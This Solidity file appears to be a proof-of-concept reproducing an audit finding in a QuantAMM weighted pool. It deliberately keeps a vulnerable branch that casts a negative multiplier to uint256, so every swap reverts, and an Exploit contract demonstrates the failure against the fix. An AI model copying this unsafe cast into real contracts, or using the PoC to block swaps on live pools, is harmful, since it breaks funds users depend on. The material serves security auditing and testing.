// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  QuantAMMWeightedPool — negative multiplier underflow (Cyfrin, 2024-12-17)
    calculateBlockNormalisedWeight casts a negative multiplier to uint256.
    That value is ~2^256, so the weight subtraction underflows and every swap
    reverts once timeSinceLastUpdate != 0. The audited branch is verbatim.
    Fix commit 31636cf negates the multiplier before mulUp.
*/

library FixedPoint {
    uint256 internal constant ONE = 1e18;

    function mulDown(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * b) / ONE;
    }

    function mulUp(uint256 a, uint256 b) internal pure returns (uint256 result) {
        // Balancer rounds up. The product is taken in assembly so a uint256(-x)
        // still returns a huge quotient instead of aborting before the subtraction
        // the report says underflows.
        assembly {
            let product := mul(a, b)
            if iszero(iszero(product)) { result := add(div(product, ONE), iszero(iszero(mod(product, ONE)))) }
        }
    }
}

contract QuantAMMWeightedPool {
    int256 public weight = 0.15e18;
    int256 public multiplier = -0.001e18;
    uint256 public lastUpdate; // stays 0: the first update was never anchored, so dt = block.timestamp

    function calculateBlockNormalisedWeight(int256 _weight, int256 _multiplier, uint256 timeSinceLastUpdate)
        public
        pure
        returns (uint256)
    {
        int256 multiplierScaled18 = _multiplier;
        if (_multiplier > 0) {
            return uint256(_weight) + FixedPoint.mulDown(uint256(multiplierScaled18), timeSinceLastUpdate);
        } else {
            return uint256(_weight) - FixedPoint.mulUp(uint256(multiplierScaled18), timeSinceLastUpdate); // @> VULN: uint256(negative) is ~2^256, so this subtraction underflows
            // FIX: return uint256(_weight) - FixedPoint.mulUp(uint256(-multiplierScaled18), timeSinceLastUpdate);
        }
    }

    function calculateFixed() public view returns (uint256) {
        uint256 dt = block.timestamp - lastUpdate; // @beat:fixed
        int256 multiplierScaled18 = multiplier;
        return uint256(weight) - FixedPoint.mulUp(uint256(-multiplierScaled18), dt);
    }

    function onSwap(uint256 amountIn) external view returns (uint256) {
        uint256 dt = block.timestamp - lastUpdate; // @beat:dt
        uint256 w = calculateBlockNormalisedWeight(weight, multiplier, dt);
        return amountIn * w / 1e18;
    }
}

contract Exploit {
    QuantAMMWeightedPool public pool;
    bool public swapFailed;
    uint256 public fixedWeight;

    constructor() {
        pool = new QuantAMMWeightedPool(); // nonce 1
    }

    function run() external {
        require(block.timestamp > 1, "timestamp too small");
        (bool ok,) = address(pool).call(abi.encodeWithSelector(pool.onSwap.selector, 1 ether)); // @beat:swap
        swapFailed = !ok; // @beat:caught
        fixedWeight = pool.calculateFixed();
        require(swapFailed, "negative-multiplier swap reverted");
        require(fixedWeight < uint256(pool.weight()), "fixed weight must fall"); // @beat:lower
        require(fixedWeight > 0, "fixed weight stays positive");
    }
}
